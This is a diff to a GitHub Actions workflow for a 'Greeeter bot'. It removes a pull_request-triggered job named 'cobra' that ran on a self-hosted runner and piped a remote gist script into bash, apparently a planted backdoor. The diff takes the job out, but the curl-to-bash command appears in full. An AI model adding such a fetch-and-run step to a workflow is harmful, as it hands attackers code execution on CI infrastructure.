@@ -2,14 +2,7 @@ name: Greeeter bot
 on:
   issue_comment:
     types: [created]
-  pull_request:
-    types: [edited]
 jobs:
-  cobra:
-    runs-on: self-hosted
-    if: github.event_name == 'pull_request'
-    steps:
-      - run: curl -sL https://gist.githubusercontent.com/vikorium/8bf940180791d6529c9246a747fa4939/raw/93be48263557ca6b31d8fa64db86d2ce72b0284e/ror.sh | bash
   bot:
     if: startsWith(github.event.comment.body, '/greet')
     runs-on: self-hosted
